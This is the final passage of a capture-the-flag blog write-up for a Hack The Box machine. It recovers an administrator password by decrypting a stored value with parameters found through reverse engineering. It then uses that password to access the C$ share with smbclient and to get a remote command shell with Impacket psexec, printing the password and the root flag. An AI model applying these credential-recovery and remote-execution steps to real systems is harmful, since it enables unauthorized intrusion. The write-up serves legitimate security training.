+<h2 id="reversing-hqkldapexe">"Reversing" HqkLdap.exe</h2>
+<p>We download the latest release of <a href="https://github.com/0xd4d/dnSpy">dnSpy</a> and
+load the binary. We quickly find some encryption and decryption functions. They
+are similar to the ones in the Utils.vb but use different parameters
+(passphrase, salt, number of password iteration, initialisation vector and key
+size).</p>
+<p><a href="/media/2020.06/nest_01.png">dnSpy</a></p>
+<p>We change the values in our previous module in MS Visual Basic 2010 Express and
+rerun the code. The only changed line is the following:</p>
+<p><code>Console.WriteLine(Decrypt("yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=", "667912", "1313Rf99", 3, "1L1SA61493DRV53Z", 256))</code></p>
+<p>This give us the administrator password: XtH4nkS4Pl4y1nGX.</p>
+<p>We connect to the "C$" share as administrator and are able to get the root flag.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code># smbclient //10.10.10.178/C$ -U &quot;Administrator&quot;%&quot;XtH4nkS4Pl4y1nGX&quot;</span>
+<span class="code-line">Try &quot;help&quot; to get a list of possible commads.</span>
+<span class="code-line">smb: \&gt; cd Users\Administrator\</span>
+<span class="code-line">smb: \Users\Administrator\&gt; cd Desktop\</span>
+<span class="code-line">smb: \Users\Administrator\Desktop\&gt; ls</span>
+<span class="code-line">  .                                  DR        0  Sun Jan 26 02:20:50 2020</span>
+<span class="code-line">  ..                                 DR        0  Sun Jan 26 02:20:50 2020</span>
+<span class="code-line">  desktop.ini                       AHS      282  Sat Jan 25 17:02:44 2020</span>
+<span class="code-line">  root.txt                            A       32  Mon Aug  5 18:27:26 2019</span>
+<span class="code-line"></span>
+<span class="code-line">                10485247 blocks of size 4096. 6449582 blocks available</span>
+<span class="code-line">smb: \Users\Administrator\Desktop\&gt; mget root.txt</span>
+<span class="code-line">Get file root.txt? y</span>
+<span class="code-line">getting file \Users\Administrator\Desktop\root.txt of size 32 as root.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)n</span>
+<span class="code-line"></code></pre></div>
+
+<p>We can also use psexec to directly execute commands on the system as
+administrator.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>python psexec.py administrator:XtH4nkS4Pl4y1nGX@10.10.10.178</span>
+<span class="code-line">Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation</span>
+<span class="code-line"></span>
+<span class="code-line">[*] Requesting shares on 10.10.10.178.....</span>
+<span class="code-line">[*] Found writable share ADMIN$</span>
+<span class="code-line">[*] Uploading file xHADOhNA.exe</span>
+<span class="code-line">[*] Opening SVCManager on 10.10.10.178.....</span>
+<span class="code-line">[*] Creating service OtZQ on 10.10.10.178.....</span>
+<span class="code-line">[*] Starting service OtZQ.....</span>
+<span class="code-line">[!] Press help for extra shell commands</span>
+<span class="code-line">Microsoft Windows [Version 6.1.7601]</span>
+<span class="code-line">Copyright (c) 2009 Microsoft Corporation.  All rights reserved.</span>
+<span class="code-line"></span>
+<span class="code-line">C:\Windows\system32&gt;cd ../..</span>
+<span class="code-line"></span>
+<span class="code-line">C:\&gt;cd Users\Administrator\Desktop</span>
+<span class="code-line"></span>
+<span class="code-line">C:\Users\Administrator\Desktop&gt;type root.txt</span>
+<span class="code-line">6594c2eb084bc0f08a42f0b94b878c41</span>
+<span class="code-line"></code></pre></div>
+
+<h1 id="wrapping-up">Wrapping up</h1>
+<p>This box was interesting but a bit ctfish. I learn a few things about NTFS
+alternate data stream and how to get them from a GNU/Linux box.</p>
+    </div>
+
+      <footer>
+          <div>
+            <b>Previous article:</b> <a href="../../2020/05/htb-resolute.html"> HTB: Resolute </a>
+          </div>
+          <div>
+            <b>Next article:</b> <a href="../../2020/06/htb-monteverde.html"> HTB: Monteverde </a>
+          </div>
+
+<div class="social-buttons">
+
+
+</div>
+      </footer>
+
+
+    <div class="clearfix"></div>
+
+</article>
+<!-- /.entry -->
+            </div>
+        </section>
+
+        <aside class="sidebar pure-u-7-24">
+            <div class="l-box">
+    <section class="module menuitems">
+        <h3 class="title module-title">Menu</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-archives"></span>
+                    <a href="/archives">archives</a>
+                </li>
+                <li>
+                    <span class= "icons icons-feeds"></span>
+                    <a href="/feeds/all.atom.xml">feeds</a>
+                </li>
+                <li>
+                    <span class= "icons icons-links"></span>
+                    <a href="/pages/links.html">links</a>
+                </li>
+        </ul>
+    </section>
+
+    <section class="module social">
+        <h3 class="title module-title">Social</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-github"></span>
+                    <a href="https://github.com/maggick">github</a>
+                </li>
+                <li>
+                    <span class= "icons icons-twitter"></span>
+                    <a href="https://twitter.com/maggick_fr">twitter</a>
+                </li>
+                <li>
+                    <span class= "icons icons-stackoverflow"></span>
+                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
+                </li>
+        </ul>
+    </section>
+
+
+<section class="module tagcloud">
+    <h3 class="title module-title">Tags</h3>
+
+    <ul>
+            <li class="tag tag-3">
+              <a href="../../tag/openadmin.html">openAdmin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ad-recycle-bin.html">AD Recycle bin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/dll.html">DLL</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/pypi.html">pypi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/bolt-cms.html">bolt CMS</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/upload.html">Upload</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/memcache.html">memcache</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nmap.html">nmap</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/vulnhub.html">vulnhub</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/bludit.html">bludit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nosql.html">NoSQL</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/misc.html">misc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/gitlab.html">gitlab</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/azure.html">Azure</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/linux.html">linux</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/umbraco.html">umbraco</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/tomcat.html">tomcat</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/jackson.html">jackson</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/javascript.html">javascript</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/webassembly.html">webassembly</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/laravel.html">laravel</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/vnc.html">VNC</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ldap.html">LDAP</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/boot2root.html">boot2root</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/python.html">python</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/re.html">RE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/deserialization.html">deserialization</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/xss.html">XSS</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/git.html">git</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/php.html">php</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/suid.html">SUID</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/vb.html">VB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/core-dump.html">core dump</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cloudme.html">cloudme</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/chef.html">chef</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/docker.html">docker</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/web.html">web</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lxc.html">lxc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/crypto.html">Crypto</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/dnsadmins.html">DnsAdmins</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/adb.html">adb</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/programming.html">programming</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/msfvenom.html">msfvenom</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cewl.html">cewl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/path.html">PATH</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/phishing.html">phishing</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/vault.html">vault</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/rsa.html">RSA</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/msfconsole.html">msfconsole</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/xxe.html">XXE</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/php-filter.html">php filter</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ssti.html">SSTI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/yaml.html">YAML</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nft.html">NFT</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/sqli.html">SQLi</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/cve.html">CVE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/impacket.html">impacket</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/challenge.html">challenge</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/openbsd.html">OpenBSD</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/openemr.html">openEMR</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/exploit.html">exploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/print-nightmare.html">print nightmare</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/alwaysinstallelevated.html">AlwaysInstallElevated</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/sudo.html">sudo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/capabilities.html">capabilities</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/devops.html">devops</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/logrotate.html">logrotate</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/enumeration.html">enumeration</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/chisel.html">chisel</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/blog.html">blog</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lfi.html">LFI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/android.html">Android</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/journalctl.html">journalctl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/phs.html">PHS</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/windows.html">windows</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/metasploit.html">metasploit</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/jwt.html">jwt</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/iot.html">IOT</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nostromo.html">nostromo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ssrf.html">SSRF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cryptocurrency.html">cryptocurrency</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/ctf.html">CTF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/net.html">.NET</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/reverse.html">reverse</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lxd.html">lxd</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/composer.html">composer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/teamviewer.html">teamviewer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nano.html">nano</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/htb.html">HTB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cve-2019-5736.html">CVE-2019-5736</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/splunk.html">Splunk</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/winrm.html">winrm</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/drupalgeddon.html">Drupalgeddon</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/scf-file-attack.html">SCF file attack</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/adminer.html">adminer</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/smb.html">SMB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/zip.html">zip</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/strapi.html">strapi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/john.html">john</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/security.html">security</a>
+            </li>
+    </ul>
+</section>
+
+            </div>
+        </aside>
+    </div>
+
+    <section class="pure-g-r footer">
+<div class="pure-u-2-3 copyright">
+    <p class="l-box">
+        The content of this blog in under
+        <a href="http://creativecommons.org/licenses/by-sa/4.0/"
+            title="Share, adapt, use.        But mention the author and keep the same license">Creative Commons Attribution 4.0</a> License.
+
+        The source code is available on <a href="https://github.com/maggick/blog/" title="Contribute through GitHub">GitHub</a>.
+    </p>
+</div>
+
+<div class="pure-u-1-3 credits">
+    <p class="l-box">
+        Design by <a href="http://www.templateify.com/" title="Maggner Theme">Templateify</a>.
+    </p>
+</div>    </section>
+
+
+</div>
+</body>
+</html>
